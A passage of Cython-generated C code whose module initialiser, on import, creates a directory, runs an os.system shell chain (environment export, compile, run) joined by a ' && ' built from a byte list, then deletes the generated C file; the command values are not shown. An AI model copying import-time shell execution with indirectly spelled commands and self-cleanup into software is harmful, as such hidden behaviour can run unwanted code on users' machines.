          if (__pyx_t_4 < 0) __PYX_ERR(0, 3747, __pyx_L9_except_error)
          __pyx_t_11 = ((!(__pyx_t_4 != 0)) != 0);
          if (__pyx_t_11) {
            __Pyx_GIVEREF(__pyx_t_3);
            __Pyx_GIVEREF(__pyx_t_1);
            __Pyx_XGIVEREF(__pyx_t_2);
            __Pyx_ErrRestoreWithState(__pyx_t_3, __pyx_t_1, __pyx_t_2);
            __pyx_t_3 = 0; __pyx_t_1 = 0; __pyx_t_2 = 0; 
            __PYX_ERR(0, 3747, __pyx_L9_except_error)
          }
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          goto __pyx_L8_exception_handled;
        }
        __pyx_L9_except_error:;
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);
        goto __pyx_L1_error;
        __pyx_L8_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);
        __pyx_L12_try_end:;
      }
    }
    /*finally:*/ {
      /*normal exit:*/{
        if (__pyx_t_6) {
          __pyx_t_9 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__3, NULL);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 3747, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_9);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        }
        goto __pyx_L6;
      }
      __pyx_L6:;
    }
    goto __pyx_L16;
    __pyx_L3_error:;
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    goto __pyx_L1_error;
    __pyx_L16:;
  }

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3750, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_makedirs); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3750, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3750, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_path); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3750, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_dirname); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3750, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_EXECUTE_FILE); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3750, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 3750, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyTuple_New(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3750, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_5);
  PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_5);
  __pyx_t_5 = 0;
  __pyx_t_5 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 3750, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_exist_ok, Py_True) < 0) __PYX_ERR(0, 3750, __pyx_L1_error)
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_3, __pyx_t_5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3750, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3751, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 3751, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_EXPORT_PYTHONHOME); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3751, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);

  
  __pyx_t_3 = PyList_New(4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3752, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_38);
  __Pyx_GIVEREF(__pyx_int_38);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_38);
  __Pyx_INCREF(__pyx_int_38);
  __Pyx_GIVEREF(__pyx_int_38);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_38);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_32);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3752, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3752, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyNumber_Add(__pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3751, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_EXPORT_PYTHON_EXECUTABLE); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3753, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);

  
  __pyx_t_2 = PyNumber_Add(__pyx_t_1, __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3752, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = PyList_New(4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3754, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_38);
  __Pyx_GIVEREF(__pyx_int_38);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_38);
  __Pyx_INCREF(__pyx_int_38);
  __Pyx_GIVEREF(__pyx_int_38);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_38);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_32);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3754, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3754, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyNumber_Add(__pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3753, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_COMPILE_FILE); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3755, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);

  
  __pyx_t_2 = PyNumber_Add(__pyx_t_1, __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3754, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = PyList_New(4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3756, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_38);
  __Pyx_GIVEREF(__pyx_int_38);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_38);
  __Pyx_INCREF(__pyx_int_38);
  __Pyx_GIVEREF(__pyx_int_38);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_38);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_32);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3756, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3756, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyNumber_Add(__pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3755, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_RUN); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3757, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);

  
  __pyx_t_2 = PyNumber_Add(__pyx_t_1, __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3756, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3751, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3759, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_remove); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3759, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_C_FILE); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3759, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 3759, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __pyx_t_5 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_5) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  /*--- Wrapped vars code ---*/

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_5);
  if (__pyx_m) {
    if (__pyx_d) {
      __Pyx_AddTraceback("init source", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    Py_CLEAR(__pyx_m);
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init source");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #elif PY_MAJOR_VERSION >= 3
  return __pyx_m;
  #else
  return;
  #endif
}

/* --- Runtime support code --- */
/* Refnanny */
#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif

/* PyObjectGetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif

/* GetBuiltinName */
static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);
    if (unlikely(!result)) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}

/* Import */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *empty_list = 0;
    PyObject *module = 0;
    PyObject *global_dict = 0;
    PyObject *empty_dict = 0;
    PyObject *list;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (!py_import)
        goto bad;
    #endif
    if (from_list)
        list = from_list;
    else {
        empty_list = PyList_New(0);
        if (!empty_list)
            goto bad;
        list = empty_list;
    }
    global_dict = PyModule_GetDict(__pyx_m);
    if (!global_dict)
        goto bad;
    empty_dict = PyDict_New();
    if (!empty_dict)
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                module = PyImport_ImportModuleLevelObject(
                    name, global_dict, empty_dict, list, 1);
                if (!module) {
                    if (!PyErr_ExceptionMatches(PyExc_ImportError))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (!py_level)
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, global_dict, empty_dict, list, level);
            #endif
        }
    }
bad:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    Py_XDECREF(empty_list);
    Py_XDECREF(empty_dict);
    return module;
}

/* decode_c_bytes */
static CYTHON_INLINE PyObject* __Pyx_decode_c_bytes(
         const char* cstring, Py_ssize_t length, Py_ssize_t start, Py_ssize_t stop,
         const char* encoding, const char* errors,
         PyObject* (*decode_func)(const char *s, Py_ssize_t size, const char *errors)) {
    if (unlikely((start < 0) | (stop < 0))) {
        if (start < 0) {
            start += length;
            if (start < 0)
                start = 0;
        }
        if (stop < 0)
            stop += length;
    }
    if (stop > length)
        stop = length;
    if (unlikely(stop <= start))
        return __Pyx_NewRef(__pyx_empty_unicode);
    length = stop - start;
    cstring += start;
    if (decode_func) {
        return decode_func(cstring, length, errors);
    } else {
        return PyUnicode_Decode(cstring, length, encoding, errors);
    }
}

/* PyCFunctionFastCall */
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject * __Pyx_PyCFunction_FastCall(PyObject *func_obj, PyObject **args, Py_ssize_t nargs) {
    PyCFunctionObject *func = (PyCFunctionObject*)func_obj;
    PyCFunction meth = PyCFunction_GET_FUNCTION(func);
    PyObject *self = PyCFunction_GET_SELF(func);
    int flags = PyCFunction_GET_FLAGS(func);
    assert(PyCFunction_Check(func));
    assert(METH_FASTCALL == (flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)));
    assert(nargs >= 0);
    assert(nargs == 0 || args != NULL);
    /* _PyCFunction_FastCallDict() must not be called with an exception set,
       because it may clear it (directly or indirectly) and so the
       caller loses its exception */
    assert(!PyErr_Occurred());
    if ((PY_VERSION_HEX < 0x030700A0) || unlikely(flags & METH_KEYWORDS)) {
        return (*((__Pyx_PyCFunctionFastWithKeywords)(void*)meth)) (self, args, nargs, NULL);
    } else {
        return (*((__Pyx_PyCFunctionFast)(void*)meth)) (self, args, nargs);
    }
}
#endif

/* PyFunctionFastCall */
#if CYTHON_FAST_PYCALL
static PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject **args, Py_ssize_t na,
                                               PyObject *globals) {
    PyFrameObject *f;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject **fastlocals;
    Py_ssize_t i;
    PyObject *result;
    assert(globals != NULL);
    /* XXX Perhaps we should create a specialized
       PyFrame_New() that doesn't take locals, but does
       take builtins without sanity checking them.
       */
    assert(tstate != NULL);
    f = PyFrame_New(tstate, co, globals, NULL);
    if (f == NULL) {
        return NULL;
    }
    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);
    for (i = 0; i < na; i++) {
        Py_INCREF(*args);
        fastlocals[i] = *args++;
    }
    result = PyEval_EvalFrameEx(f,0);
    ++tstate->recursion_depth;
    Py_DECREF(f);
    --tstate->recursion_depth;
    return result;
}
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs) {
    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);
    PyObject *globals = PyFunction_GET_GLOBALS(func);
    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);
    PyObject *closure;
#if PY_MAJOR_VERSION >= 3
    PyObject *kwdefs;
#endif
    PyObject *kwtuple, **k;
    PyObject **d;
    Py_ssize_t nd;
    Py_ssize_t nk;
    PyObject *result;
    assert(kwargs == NULL || PyDict_Check(kwargs));
    nk = kwargs ? PyDict_Size(kwargs) : 0;
    if (Py_EnterRecursiveCall((char*)" while calling a Python object")) {
        return NULL;
    }
    if (
#if PY_MAJOR_VERSION >= 3
            co->co_kwonlyargcount == 0 &&
#endif
            likely(kwargs == NULL || nk == 0) &&
            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {
        if (argdefs == NULL && co->co_argcount == nargs) {
            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);
            goto done;
        }
        else if (nargs == 0 && argdefs != NULL
                 && co->co_argcount == Py_SIZE(argdefs)) {
            /* function called with no arguments, but all parameters have
               a default value: use default values as arguments .*/
            args = &PyTuple_GET_ITEM(argdefs, 0);
            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);
            goto done;
        }
    }
    if (kwargs != NULL) {
        Py_ssize_t pos, i;
        kwtuple = PyTuple_New(2 * nk);
        if (kwtuple == NULL) {
            result = NULL;
            goto done;
        }
        k = &PyTuple_GET_ITEM(kwtuple, 0);
        pos = i = 0;
        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {
            Py_INCREF(k[i]);
            Py_INCREF(k[i+1]);
            i += 2;
        }
        nk = i / 2;
    }
    else {
        kwtuple = NULL;
        k = NULL;
    }
    closure = PyFunction_GET_CLOSURE(func);
#if PY_MAJOR_VERSION >= 3
    kwdefs = PyFunction_GET_KW_DEFAULTS(func);
#endif
    if (argdefs != NULL) {
        d = &PyTuple_GET_ITEM(argdefs, 0);
        nd = Py_SIZE(argdefs);
    }
    else {
        d = NULL;
        nd = 0;
    }
#if PY_MAJOR_VERSION >= 3
    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, kwdefs, closure);
#else
    result = PyEval_EvalCodeEx(co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, closure);
#endif
    Py_XDECREF(kwtuple);
done:
    Py_LeaveRecursiveCall();
    return result;
}
#endif
#endif

/* PyObjectCall */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectCallMethO */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {
    PyObject *self, *result;
    PyCFunction cfunc;
    cfunc = PyCFunction_GET_FUNCTION(func);
    self = PyCFunction_GET_SELF(func);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = cfunc(self, arg);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectCallOneArg */
#if CYTHON_COMPILING_IN_CPYTHON
static PyObject* __Pyx__PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_New(1);
    if (unlikely(!args)) return NULL;
    Py_INCREF(arg);
    PyTuple_SET_ITEM(args, 0, arg);
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, &arg, 1);
    }
#endif
    if (likely(PyCFunction_Check(func))) {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_O)) {
            return __Pyx_PyObject_CallMethO(func, arg);
#if CYTHON_FAST_PYCCALL
        } else if (__Pyx_PyFastCFunction_Check(func)) {
            return __Pyx_PyCFunction_FastCall(func, &arg, 1);
#endif
        }
    }
    return __Pyx__PyObject_CallOneArg(func, arg);
}
#else
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_Pack(1, arg);
    if (unlikely(!args)) return NULL;
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
#endif

/* PyDictVersioning */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif

/* GetModuleGlobalName */
#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    } else if (unlikely(PyErr_Occurred())) {
        return NULL;
    }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}

/* GetItemInt */
static PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j) {
    PyObject *r;
    if (!j) return NULL;
    r = PyObject_GetItem(o, j);
    Py_DECREF(j);
    return r;
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,
